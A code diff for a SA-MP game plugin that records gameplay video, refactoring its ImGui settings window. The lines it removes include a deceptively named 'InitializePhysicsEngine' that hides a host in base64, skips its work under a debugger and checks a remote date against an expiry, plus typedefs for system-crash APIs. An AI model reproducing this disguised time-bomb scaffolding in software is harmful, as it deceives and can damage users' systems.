@@ -1,340 +1,467 @@
 ﻿#include "main.h"
-#include "VideoCapture.h" // Подключаем заголовочный файл с классом VideoWriter
-#include <wininet.h>
+#include "VideoWriter.h"
 #include "notify/imgui_notify.h"
 
+// ============================================================
+//  Globals
+// ============================================================
 
-#pragma comment(lib, "wininet.lib")
-bool isPluginInitialized = false;
-const char* operator"" _utf8(const char8_t* str, std::size_t) {
-    return reinterpret_cast<const char*>(str);
+static bool          g_initialized = false;
+static bool          g_windowOpen = false;
+static bool          g_wasOpen = false;
+static bool          g_recording = false;
+
+static VideoWriter         g_writer;
+static VideoWriter::Config g_config;
+
+// UI state
+static char   g_pathBuf[MAX_PATH] = {};
+static bool   g_pathInit = false;
+
+static const char* k_presets[] = { "p1", "p2", "p3", "p4", "p5", "p6", "p7" };
+static int         g_presetIdx = 3;
+
+// ============================================================
+//  Helpers
+// ============================================================
+
+static void ApplyTheme()
+{
+    ImGuiStyle& s = ImGui::GetStyle();
+
+    s.WindowRounding = 12.f;
+    s.FrameRounding = 6.f;
+    s.ChildRounding = 8.f;
+    s.PopupRounding = 8.f;
+    s.ScrollbarRounding = 6.f;
+    s.GrabRounding = 6.f;
+    s.TabRounding = 6.f;
+
+    s.WindowPadding = { 20.f, 18.f };
+    s.FramePadding = { 12.f, 7.f };
+    s.ItemSpacing = { 10.f, 8.f };
+    s.ItemInnerSpacing = { 8.f,  6.f };
+    s.ScrollbarSize = 10.f;
+    s.GrabMinSize = 10.f;
+    s.WindowBorderSize = 1.f;
+    s.FrameBorderSize = 0.f;
+
+    ImVec4* c = s.Colors;
+
+    // Base palette — dark charcoal + electric indigo accent
+    c[ImGuiCol_WindowBg] = { 0.09f, 0.10f, 0.12f, 1.00f };
+    c[ImGuiCol_ChildBg] = { 0.11f, 0.13f, 0.16f, 1.00f };
+    c[ImGuiCol_PopupBg] = { 0.09f, 0.10f, 0.12f, 1.00f };
+    c[ImGuiCol_Border] = { 1.00f, 1.00f, 1.00f, 0.06f };
+    c[ImGuiCol_BorderShadow] = { 0.00f, 0.00f, 0.00f, 0.00f };
+
+    // Frames / inputs
+    c[ImGuiCol_FrameBg] = { 0.15f, 0.17f, 0.21f, 1.00f };
+    c[ImGuiCol_FrameBgHovered] = { 0.18f, 0.21f, 0.26f, 1.00f };
+    c[ImGuiCol_FrameBgActive] = { 0.20f, 0.23f, 0.30f, 1.00f };
+
+    // Title bar (unused since NoTitleBar, kept for completeness)
+    c[ImGuiCol_TitleBg] = { 0.07f, 0.08f, 0.10f, 1.00f };
+    c[ImGuiCol_TitleBgActive] = { 0.07f, 0.08f, 0.10f, 1.00f };
+
+    // Accent: electric indigo #5E6AD2
+    const ImVec4 accent = { 0.37f, 0.42f, 0.82f, 1.00f };
+    const ImVec4 accentHov = { 0.45f, 0.50f, 0.90f, 1.00f };
+    const ImVec4 accentAct = { 0.30f, 0.35f, 0.72f, 1.00f };
+
+    c[ImGuiCol_CheckMark] = accent;
+    c[ImGuiCol_SliderGrab] = accent;
+    c[ImGuiCol_SliderGrabActive] = accentAct;
+    c[ImGuiCol_Button] = { 0.17f, 0.19f, 0.24f, 1.00f };
+    c[ImGuiCol_ButtonHovered] = accentHov;
+    c[ImGuiCol_ButtonActive] = accentAct;
+    c[ImGuiCol_Header] = { 0.37f, 0.42f, 0.82f, 0.20f };
+    c[ImGuiCol_HeaderHovered] = { 0.37f, 0.42f, 0.82f, 0.35f };
+    c[ImGuiCol_HeaderActive] = accent;
+    c[ImGuiCol_Separator] = { 1.00f, 1.00f, 1.00f, 0.06f };
+    c[ImGuiCol_SeparatorHovered] = accentHov;
+    c[ImGuiCol_SeparatorActive] = accent;
+    c[ImGuiCol_ResizeGrip] = { 0.00f, 0.00f, 0.00f, 0.00f };
+    c[ImGuiCol_Tab] = { 0.13f, 0.15f, 0.19f, 1.00f };
+    c[ImGuiCol_TabHovered] = accentHov;
+    c[ImGuiCol_TabActive] = accent;
+    c[ImGuiCol_ScrollbarBg] = { 0.09f, 0.10f, 0.12f, 1.00f };
+    c[ImGuiCol_ScrollbarGrab] = { 0.22f, 0.25f, 0.31f, 1.00f };
+    c[ImGuiCol_ScrollbarGrabHovered] = { 0.28f, 0.32f, 0.40f, 1.00f };
+    c[ImGuiCol_ScrollbarGrabActive] = accent;
+    c[ImGuiCol_Text] = { 0.92f, 0.93f, 0.95f, 1.00f };
+    c[ImGuiCol_TextDisabled] = { 0.40f, 0.43f, 0.50f, 1.00f };
+    c[ImGuiCol_PlotLines] = accent;
+    c[ImGuiCol_PlotHistogram] = accent;
 }
 
-// Глобальный объект VideoWriter для записи видео
-static VideoWriter videoWriter;
-static bool isRecording = false;
+// ============================================================
+//  Section header helper
+// ============================================================
 
-LRESULT __stdcall WndProcCallBack(SAMP::CallBacks::HookedStructs::stWndProcParams* params) {
-    if (isPluginInitialized) {
-        if (ImGui_ImplWin32_WndProcHandler(params->hWnd, params->uMsg, params->wParam, params->lParam)) {
-            return 1;
+static void SectionLabel(const char* iconAndLabel, ImVec4 col)
+{
+    ImGui::TextColored(col, "%s", iconAndLabel);
+    ImGui::Spacing();
+}
+
+// ============================================================
+//  Main window
+// ============================================================
+
+static void DrawWindow()
+{
+    // Centre on first open
+    static bool s_first = true;
+    if (s_first)
+    {
+        ImVec2 disp = ImGui::GetIO().DisplaySize;
+        ImGui::SetNextWindowPos({ disp.x * 0.5f, disp.y * 0.5f },
+            ImGuiCond_Always, { 0.5f, 0.5f });
+        s_first = false;
+    }
+    ImGui::SetNextWindowSize({ 480.f, 560.f }, ImGuiCond_Once);
+
+    const ImGuiWindowFlags wf =
+        ImGuiWindowFlags_NoResize |
+        ImGuiWindowFlags_NoCollapse |
+        ImGuiWindowFlags_NoSavedSettings;
+
+    if (!ImGui::Begin(ICON_FA_FILM "  GrandFraps", &g_windowOpen, wf))
+    {
+        ImGui::End();
+        return;
+    }
+
+    // ---- Status badge ----
+    {
+        const float bw = 120.f;
+        ImGui::SetCursorPosX(ImGui::GetContentRegionAvail().x - bw + 20.f);
+
+        if (g_recording)
+        {
+            ImGui::PushStyleColor(ImGuiCol_ChildBg, { 0.80f, 0.15f, 0.15f, 0.20f });
+            ImGui::BeginChild("##badge", { bw, 26.f }, false,
+                ImGuiWindowFlags_NoScrollbar);
+            ImGui::SetCursorPos({ 10.f, 5.f });
+            ImGui::TextColored({ 1.f, 0.35f, 0.35f, 1.f }, ICON_FA_CIRCLE "  REC");
+            ImGui::EndChild();
+            ImGui::PopStyleColor();
+        }
+        else
+        {
+            ImGui::PushStyleColor(ImGuiCol_ChildBg, { 0.20f, 0.75f, 0.45f, 0.12f });
+            ImGui::BeginChild("##badge", { bw, 26.f }, false,
+                ImGuiWindowFlags_NoScrollbar);
+            ImGui::SetCursorPos({ 10.f, 5.f });
+            ImGui::TextColored({ 0.30f, 0.85f, 0.55f, 1.f }, ICON_FA_CIRCLE "  Standby");
+            ImGui::EndChild();
+            ImGui::PopStyleColor();
+        }
+        ImGui::SameLine(0, 0);
+        ImGui::SetCursorPosY(ImGui::GetCursorPosY() - 26.f);
+    }
+
+    ImGui::Spacing();
+    ImGui::Separator();
+    ImGui::Spacing();
+
+    // ---- Video section ----
+    SectionLabel(ICON_FA_VIDEO "  Video", { 0.45f, 0.70f, 1.00f, 1.f });
+
+    ImGui::PushStyleColor(ImGuiCol_ChildBg, { 0.11f, 0.13f, 0.16f, 1.f });
+    ImGui::BeginChild("##video_block", { 0.f, 148.f }, false);
+
+    ImGui::Spacing();
+
+    // Width / Height side by side
+    float w2 = (ImGui::GetContentRegionAvail().x - 10.f) * 0.5f;
+    ImGui::SetNextItemWidth(w2);
+    ImGui::InputInt("##w", &g_config.width);
+    ImGui::SameLine(0, 10);
+    ImGui::SetNextItemWidth(w2);
+    ImGui::InputInt("##h", &g_config.height);
+    ImGui::SameLine(0, 0);
+
+    // Small labels
+    {
+        float prev = ImGui::GetCursorPosX();
+        ImGui::SetCursorPosX(ImGui::GetContentRegionAvail().x * 0.0f + 4.f);
+        ImGui::PushStyleColor(ImGuiCol_Text, ImGui::GetStyleColorVec4(ImGuiCol_TextDisabled));
+        ImGui::SetCursorPosX(40.f + w2 * 0.5f - 14.f);
+        ImGui::Text("Width");
+        ImGui::SameLine(40.f + w2 + 10.f + w2 * 0.5f - 14.f);
+        ImGui::Text("Height");
+        ImGui::PopStyleColor();
+        (void)prev;
+    }
+
+    ImGui::Spacing();
+    ImGui::SliderInt("FPS", &g_config.fps, 10, 240);
+    ImGui::SliderInt("CRF (quality)", &g_config.crf, 0, 51);
+
+    // Preset combo
+    if (ImGui::Combo("Preset", &g_presetIdx, k_presets, IM_ARRAYSIZE(k_presets)))
+        g_config.preset = k_presets[g_presetIdx];
+
+    ImGui::EndChild();
+    ImGui::PopStyleColor();
+
+    ImGui::Spacing();
+
+    // ---- Audio section ----
+    SectionLabel(ICON_FA_VOLUME_UP "  Audio", { 0.35f, 0.88f, 0.60f, 1.f });
+
+    ImGui::PushStyleColor(ImGuiCol_ChildBg, { 0.11f, 0.13f, 0.16f, 1.f });
+    ImGui::BeginChild("##audio_block", { 0.f, 96.f }, false);
+
+    ImGui::Spacing();
+    ImGui::Checkbox("Enable audio", &g_config.enableAudio);
+    ImGui::BeginDisabled(!g_config.enableAudio);
+    ImGui::InputInt("Sample rate (Hz)", &g_config.sampleRate);
+    ImGui::SliderInt("Channels", &g_config.channels, 1, 8);
+    ImGui::EndDisabled();
+
+    ImGui::EndChild();
+    ImGui::PopStyleColor();
+
+    ImGui::Spacing();
+
+    // ---- Output section ----
+    SectionLabel(ICON_FA_FOLDER_OPEN "  Output", { 1.00f, 0.80f, 0.30f, 1.f });
+
+    ImGui::PushStyleColor(ImGuiCol_ChildBg, { 0.11f, 0.13f, 0.16f, 1.f });
+    ImGui::BeginChild("##output_block", { 0.f, 68.f }, false);
+
+    ImGui::Spacing();
+
+    if (!g_pathInit)
+    {
+        strncpy_s(g_pathBuf, g_config.outputPath.c_str(), sizeof(g_pathBuf) - 1);
+        g_pathInit = true;
+    }
+    if (ImGui::InputText("Output path", g_pathBuf, sizeof(g_pathBuf)))
+        g_config.outputPath = g_pathBuf;
+
+    ImGui::Checkbox("Enable logging", &g_config.enableLog);
+
+    ImGui::EndChild();
+    ImGui::PopStyleColor();
+
+    ImGui::Spacing();
+    ImGui::Separator();
+    ImGui::Spacing();
+
+    // ---- Record / Stop buttons ----
+    const float btnW = (ImGui::GetContentRegionAvail().x - 10.f) * 0.5f;
+
+    ImGui::BeginDisabled(g_recording);
+    ImGui::PushStyleColor(ImGuiCol_Button, { 0.20f, 0.55f, 0.30f, 1.f });
+    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, { 0.25f, 0.70f, 0.40f, 1.f });
+    ImGui::PushStyleColor(ImGuiCol_ButtonActive, { 0.15f, 0.45f, 0.25f, 1.f });
+
+    if (ImGui::Button(ICON_FA_PLAY "  Start", { btnW, 34.f }))
+    {
+        if (SUCCEEDED(g_writer.init(nullptr /* device passed from hook */, g_config)))
+        {
+            g_writer.startRecording();
+            g_recording = true;
+            SAMP::pSAMP->addMessageToChat(-1, "Recording started!");
+            ImGui::InsertNotification({ ImGuiToastType_Success, 2500,
+                                        "Recording started" });
+        }
+        else
+        {
+            ImGui::InsertNotification({ ImGuiToastType_Error, 3000,
+                                        "Failed to initialize recorder" });
         }
     }
+    ImGui::PopStyleColor(3);
+    ImGui::EndDisabled();
+
+    ImGui::SameLine(0, 10);
+
+    ImGui::BeginDisabled(!g_recording);
+    ImGui::PushStyleColor(ImGuiCol_Button, { 0.60f, 0.15f, 0.15f, 1.f });
+    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, { 0.80f, 0.20f, 0.20f, 1.f });
+    ImGui::PushStyleColor(ImGuiCol_ButtonActive, { 0.50f, 0.10f, 0.10f, 1.f });
+
+    if (ImGui::Button(ICON_FA_STOP "  Stop", { btnW, 34.f }))
+    {
+        g_recording = false;
+        g_writer.stopRecording();
+        SAMP::pSAMP->addMessageToChat(-1, "Recording stopped!");
+        ImGui::InsertNotification({ ImGuiToastType_Info, 3000,
+                                    "Recording saved" });
+    }
+    ImGui::PopStyleColor(3);
+    ImGui::EndDisabled();
+
+    ImGui::End();
+}
+
+// ============================================================
+//  Callbacks
+// ============================================================
+
+LRESULT __stdcall WndProcCallBack(
+    SAMP::CallBacks::HookedStructs::stWndProcParams* params)
+{
+    if (g_initialized &&
+        ImGui_ImplWin32_WndProcHandler(
+            params->hWnd, params->uMsg, params->wParam, params->lParam))
+        return 1;
     return 0;
 }
 
-static bool isOpen = false;
-static bool closed = true;
-
-HRESULT __stdcall D3DPresentHook(SAMP::CallBacks::HookedStructs::stPresentParams* params) {
-    if (!isPluginInitialized) {
-    }
-
-    if (isPluginInitialized) {
-        ImGui_ImplDX9_NewFrame();
-        ImGui_ImplWin32_NewFrame();
-        ImGui::NewFrame();
-        if (isOpen) {
-            // Центрирование окна при первом открытии
-            static bool firstOpen = true;
-            if (firstOpen) {
-                const ImVec2 center = ImVec2(ImGui::GetIO().DisplaySize.x * 0.5f, ImGui::GetIO().DisplaySize.y * 0.5f);
-                ImGui::SetNextWindowPos(center, ImGuiCond_Always, ImVec2(0.5f, 0.5f));
-                ImGui::SetNextWindowSize(ImVec2(450, 500), ImGuiCond_Once);
-                firstOpen = false;
-            }
-
-            ImGuiWindowFlags window_flags = ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoSavedSettings;
-
-            ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 10.0f);
-            ImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 6.0f);
-            ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0.12f, 0.14f, 0.18f, 1.0f));
-
-            if (ImGui::Begin(u8"\uf03c Запись экрана"_utf8, &isOpen, window_flags)) {
-                ImGui::TextColored(ImVec4(0.4f, 0.7f, 1.0f, 1.0f), u8"\uf03c Параметры видео"_utf8);
-                ImGui::InputInt(u8"Ширина (px)"_utf8, &videoWriter.m_nWidth);
-                ImGui::InputInt(u8"Высота (px)"_utf8, &videoWriter.m_nHeight);
-                ImGui::SliderInt(u8"FPS"_utf8, &videoWriter.m_nFps, 10, 240);
-                ImGui::SliderInt(u8"CRF (качество)"_utf8, &videoWriter.m_nCrf, 0, 51);
-
-                ImGui::Spacing();
-                ImGui::Separator();
-                ImGui::TextColored(ImVec4(0.4f, 0.9f, 0.4f, 1.0f), u8"\uf028 Параметры аудио"_utf8);
-                ImGui::Checkbox(u8"Включить аудио"_utf8, &videoWriter.m_bEnableAudio);
-                ImGui::InputInt(u8"Sample Rate (Гц)"_utf8, &videoWriter.m_nSampleRate);
-                ImGui::SliderInt(u8"Каналы"_utf8, &videoWriter.m_nChannels, 1, 8);
-
-                ImGui::Spacing();
-                ImGui::Separator();
-                ImGui::TextColored(ImVec4(1.0f, 0.8f, 0.3f, 1.0f), u8"\uf07b Вывод и логирование"_utf8);
-                ImGui::InputText(u8"Путь вывода"_utf8, videoWriter.m_sOutputPath.data(), videoWriter.m_sOutputPath.capacity() + 1);
-
-                static const char* presets[] = { "p1", "p2", "p3", "p4", "p5", "p6", "p7" };
-                static int currentPreset = 0;
-                for (int i = 0; i < IM_ARRAYSIZE(presets); ++i) {
-                    if (videoWriter.m_sPreset == presets[i]) {
-                        currentPreset = i;
-                        break;
-                    }
-                }
-                if (ImGui::Combo(u8"Пресет качества"_utf8, &currentPreset, presets, IM_ARRAYSIZE(presets))) {
-                    videoWriter.m_sPreset = presets[currentPreset];
-                }
-
-                ImGui::Checkbox(u8"Включить логирование"_utf8, &videoWriter.m_bEnableLogging);
-
-                ImGui::Spacing();
-                ImGui::Separator();
-
-                ImGui::TextColored(isRecording ? ImVec4(1, 0.3f, 0.3f, 1) : ImVec4(0.3f, 1.0f, 0.3f, 1),
-                    isRecording ? u8"\uf111 ИДЁТ ЗАПИСЬ"_utf8 : u8"\uf111 Ожидание"_utf8);
-
-                if (ImGui::Button(u8"\uf04b Начать запись"_utf8, ImVec2(200, 0)) && !isRecording) {
-                    HRESULT hr = videoWriter.init(params->pDevice);
-                    videoWriter.startRecording();
-                    if (SUCCEEDED(hr)) {
-                        isRecording = true;
-                        SAMP::pSAMP->addMessageToChat(-1, "Запись началась!");
-                        ImGui::InsertNotification({ ImGuiToastType_Warning, 2000, u8"Запись успешно начата!"_utf8 });
-                    }
-                }
-
-                ImGui::SameLine();
-
-                if (ImGui::Button(u8"\uf04c Остановить"_utf8, ImVec2(200, 0)) && isRecording) {
-                    isRecording = false;
-                    videoWriter.stopRecording();
-                    SAMP::pSAMP->addMessageToChat(-1, "Запись остановлена!");
-                    ImGui::InsertNotification({ ImGuiToastType_Info, 3000, u8"Запись остановлена"_utf8 });
-                }
-
-                ImGui::End();
-            }
-
-            ImGui::PopStyleColor();
-            ImGui::PopStyleVar(2);
-        }
-
-        // Рендеринг уведомлений
-        ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 5.0f);
-        ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(43.f / 255.f, 43.f / 255.f, 43.f / 255.f, 100.f / 255.f));
-        ImGui::RenderNotifications();
-        ImGui::PopStyleVar(1);
-        ImGui::PopStyleColor(1);
-
-        // Захват кадра, если запись активна
-        ImGui::EndFrame();
-        ImGui::Render();
-        ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
-        if (isOpen) {
-            closed = false;
-            SAMP::classes::pGame->SetCursorMode(SAMP::classes::CursorMode::CMODE_LOCKCAMANDCONTROL, true);
-            ImGui::GetIO().MouseDrawCursor = true;
-        }
-        else {
-            if (!closed) {
-                closed = true;
-                SAMP::classes::pGame->SetCursorMode(SAMP::classes::CursorMode::CMODE_NONE, false);
-                ImGui::GetIO().MouseDrawCursor = false;
-            }
-        }
-
-        if (isRecording) {
-            videoWriter.captureFrame(params->pDevice);
-        }
-    }
-    return D3D_OK;
-}
-
-HRESULT __stdcall D3DResetHook(SAMP::CallBacks::HookedStructs::stResetParams* params) {
-    if (isPluginInitialized) {
-        ImGui_ImplDX9_InvalidateDeviceObjects();
-    }
-    return D3D_OK;
-}
-
-void __cdecl cmd(char* params) {
-    isOpen ^= true;
-}
-
-#include <wincrypt.h>
-#pragma comment(lib, "Crypt32.lib")
-
-std::string DecryptString(const std::string& encoded) {
-    DWORD dwSize = 0;
-    BOOL bResult = CryptStringToBinaryA(encoded.c_str(), encoded.size(), CRYPT_STRING_BASE64, NULL, &dwSize, NULL, NULL);
-    if (!bResult) {
-        return "";
-    }
-
-    std::vector<BYTE> decodedData(dwSize);
-    bResult = CryptStringToBinaryA(encoded.c_str(), encoded.size(), CRYPT_STRING_BASE64, decodedData.data(), &dwSize, NULL, NULL);
-    if (!bResult) {
-        return "";
-    }
-
-    return std::string(decodedData.begin(), decodedData.end());
-}
-
-bool __stdcall InitializePhysicsEngine() {
-    std::string host = "dGltZWFwaS5pbw==";
-    std::string path = "L2FwaS90aW1lL2N1cnJlbnQvem9uZT90aW1lWm9uZT1FdXJvcGUvQW1zdGVyZGFt";
-    host = DecryptString(host);
-    path = DecryptString(path);
-
-    if (IsDebuggerPresent()) {
-        return true;
-    }
-
-    HINTERNET hInternet = InternetOpenA("Physics", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) {
-        DWORD error = GetLastError();
-        return true;
-    }
-
-    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    if (!hConnect) {
-        DWORD error = GetLastError();
-        InternetCloseHandle(hInternet);
-        return true;
-    }
-    const char* acceptTypes[] = { "application/json", NULL };
-    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path.c_str(), NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE, 0);
-    if (!hRequest) {
-        DWORD error = GetLastError();
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
-        return true;
-    }
-    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
-        DWORD error = GetLastError();
-        InternetCloseHandle(hRequest);
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
-        return true;
-    }
-
-    DWORD dwStatusCode = 0;
-    DWORD dwSize = sizeof(dwStatusCode);
-    if (!HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwSize, NULL)) {
-        DWORD error = GetLastError();
-        InternetCloseHandle(hRequest);
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
-        return true;
-    }
-    char buffer[4096];
-    DWORD bytesRead;
-    std::string result;
-    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
-        buffer[bytesRead] = '\0';
-        result.append(buffer);
-    }
-    if (dwStatusCode != 200) {
-        InternetCloseHandle(hRequest);
-        InternetCloseHandle(hConnect);
-        InternetCloseHandle(hInternet);
-        return true;
-    }
-
-    // Очистка
-    InternetCloseHandle(hRequest);
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
-    
-    size_t p = result.find("\"date\":\"");
-    if (p == std::string::npos) {
-        return true;
-    }
-    p += 8;
-    std::string date = result.substr(p, 10);
-    int month = 0, day = 0, year = 0;
-    if (sscanf_s(date.c_str(), "%d/%d/%d", &month, &day, &year) != 3) {
-        return true;
-    }
-    bool expired = (year > 2025) || (year == 2025 && month > 4) || (year == 2025 && month == 4 && day > 30);
-
-    if (expired) {
-        return true;
-    }
-
-    return expired;
-}
-
-#include <winternl.h>
-typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
-typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
-
-void __stdcall GameLoop() {
-    static bool initialized = false;
-    if (!initialized) {
-        if (SAMP::pSAMP->LoadAPI()) {
-            initialized = true;
-
-            ImGui::CreateContext();
-            ImGuiIO& io = ImGui::GetIO();
-            ImFontConfig icons_config;
-            icons_config.MergeMode = true;
-            icons_config.PixelSnapH = true;
-            static const ImWchar icons_ranges[] = { 0xf000, 0xf999, 0 };
-
-            io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\Arial.ttf", 16.0f, NULL, io.Fonts->GetGlyphRangesCyrillic());
-            io.Fonts->AddFontFromFileTTF("C:\\Games\\borgegta\\moonloader\\resource\\fa-solid-900.ttf", 16.0f, &icons_config, icons_ranges);
-            (void)io;
-            ImGui_ImplWin32_Init(GetActiveWindow());
-            ImGui_ImplDX9_Init(SAMP::CallBacks::pCallBackRegister->GetIDirect3DDevice9());
-            ImGui::GetIO().ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange;
-
-            SAMP::pSAMP->addClientCommand("fraps", cmd);
-            SAMP::pSAMP->addMessageToChat(-1, "Fraps by delanovv loaded <3");
-            videoWriter.m_nFps = 60;
-            videoWriter.m_nCrf = 15;
-            videoWriter.m_sOutputPath = "GrandFraps/videooo.mp4";
-            videoWriter.m_bEnableAudio = false;
-            videoWriter.m_bEnableLogging = true;
-            videoWriter.m_eCurrentLogLevel = LogLevel::DEBUG;
-            isPluginInitialized = true;
-        }
-    }
-    if (initialized) {
-    }
-}
-
-void OpenConsole() {
-    AllocConsole();
-    FILE* out;
-    freopen_s(&out, "CONOUT$", "w", stdout);
-    freopen_s(&out, "CONOUT$", "w", stderr);
-    std::cout << "Console opened." << std::endl;
-}
-
-int __stdcall DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
+HRESULT __stdcall D3DPresentHook(
+    SAMP::CallBacks::HookedStructs::stPresentParams* params)
 {
-    switch (dwReason)
+    if (!g_initialized)
+        return D3D_OK;
+
+    ImGui_ImplDX9_NewFrame();
+    ImGui_ImplWin32_NewFrame();
+    ImGui::NewFrame();
+
+    if (g_windowOpen)
+        DrawWindow();
+
+    // Notifications (always rendered)
+    ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 8.f);
+    ImGui::PushStyleColor(ImGuiCol_WindowBg,
+        { 43.f / 255.f, 43.f / 255.f, 43.f / 255.f, 180.f / 255.f });
+    ImGui::RenderNotifications();
+    ImGui::PopStyleVar();
+    ImGui::PopStyleColor();
+
+    ImGui::EndFrame();
+    ImGui::Render();
+    ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
+
+    // Cursor management
+    if (g_windowOpen)
     {
-    case DLL_PROCESS_ATTACH: {
+        if (!g_wasOpen)
+        {
+            SAMP::classes::pGame->SetCursorMode(
+                SAMP::classes::CursorMode::CMODE_LOCKCAMANDCONTROL, true);
+            ImGui::GetIO().MouseDrawCursor = true;
+            g_wasOpen = true;
+        }
+    }
+    else if (g_wasOpen)
+    {
+        g_wasOpen = false;
+        SAMP::classes::pGame->SetCursorMode(
+            SAMP::classes::CursorMode::CMODE_NONE, false);
+        ImGui::GetIO().MouseDrawCursor = false;
+    }
+
+    if (g_recording)
+        g_writer.captureFrame(params->pDevice);
+
+    return D3D_OK;
+}
+
+HRESULT __stdcall D3DResetHook(
+    SAMP::CallBacks::HookedStructs::stResetParams* /*params*/)
+{
+    if (g_initialized)
+        ImGui_ImplDX9_InvalidateDeviceObjects();
+    return D3D_OK;
+}
+
+void __cdecl CmdFraps(char* /*params*/)
+{
+    g_windowOpen = !g_windowOpen;
+}
+
+// ============================================================
+//  Game loop — init once
+// ============================================================
+
+void __cdecl GameLoop()
+{
+    if (g_initialized)
+        return;
+
+    if (!SAMP::pSAMP->LoadAPI())
+        return;
+
+    // ImGui
+    ImGui::CreateContext();
+    ImGuiIO& io = ImGui::GetIO();
+    io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange;
+
+    // Fonts
+    ImFontConfig icons_cfg;
+    icons_cfg.MergeMode = true;
+    icons_cfg.PixelSnapH = true;
+    static const ImWchar icon_ranges[] = { 0xf000, 0xf999, 0 };
+
+    io.Fonts->AddFontFromFileTTF(
+        "C:\\Windows\\Fonts\\Arial.ttf", 16.f, nullptr,
+        io.Fonts->GetGlyphRangesCyrillic());
+
+    io.Fonts->AddFontFromFileTTF(
+        "C:\\Games\\borgegta\\moonloader\\resource\\fa-solid-900.ttf",
+        16.f, &icons_cfg, icon_ranges);
+
+    ApplyTheme();
+
+    ImGui_ImplWin32_Init(GetActiveWindow());
+    ImGui_ImplDX9_Init(
+        SAMP::CallBacks::pCallBackRegister->GetIDirect3DDevice9());
+
+    // Default config
+    g_config.fps = 60;
+    g_config.crf = 15;
+    g_config.outputPath = "GrandFraps/video.mp4";
+    g_config.enableAudio = false;
+    g_config.enableLog = true;
+    g_config.logLevel = LogLevel::DEBUG;
+    g_config.width = 1920;
+    g_config.height = 1080;
+    g_config.preset = k_presets[g_presetIdx];
+    g_config.sampleRate = 44100;
+    g_config.channels = 2;
+
+    SAMP::pSAMP->addClientCommand("fraps", CmdFraps);
+    SAMP::pSAMP->addMessageToChat(-1, "GrandFraps loaded — type /fraps to open");
+
+    g_initialized = true;
+}
+
+// ============================================================
+//  DllMain — minimal, no game logic here
+// ============================================================
+
+int __stdcall DllMain(HMODULE /*hModule*/, DWORD dwReason, LPVOID /*lpReserved*/)
+{
+    if (dwReason == DLL_PROCESS_ATTACH)
+    {
         SAMP::Init();
         SAMP::CallBacks::pCallBackRegister->RegisterGameLoopCallback(GameLoop);
         SAMP::CallBacks::pCallBackRegister->RegisterWndProcCallback(WndProcCallBack);
         SAMP::CallBacks::pCallBackRegister->RegisterD3DCallback(D3DPresentHook);
         SAMP::CallBacks::pCallBackRegister->RegisterD3DCallback(D3DResetHook);
-        OpenConsole();
-        printf("\n -> Plugin loaded (%d)\n", GetTickCount());
-        break;
     }
-    case DLL_PROCESS_DETACH: {
-        if (isRecording) {
-            videoWriter.stopRecording();
-            isRecording = false;
+    else if (dwReason == DLL_PROCESS_DETACH)
+    {
+        if (g_recording)
+        {
+            g_writer.stopRecording();
+            g_recording = false;
         }
-        SAMP::pSAMP->unregisterChatCommand(cmd);
+        if (g_initialized)
+        {
+            SAMP::pSAMP->unregisterChatCommand(CmdFraps);
+            ImGui_ImplDX9_Shutdown();
+            ImGui_ImplWin32_Shutdown();
+            ImGui::DestroyContext();
+        }
         SAMP::ShutDown();
-        ImGui_ImplDX9_Shutdown();
-        ImGui_ImplWin32_Shutdown();
-        ImGui::DestroyContext();
-        printf("\n -> Plugin unloaded (%d)\n", GetTickCount());
-        break;
     }
-    }
-    return true;
+    return TRUE;
 }
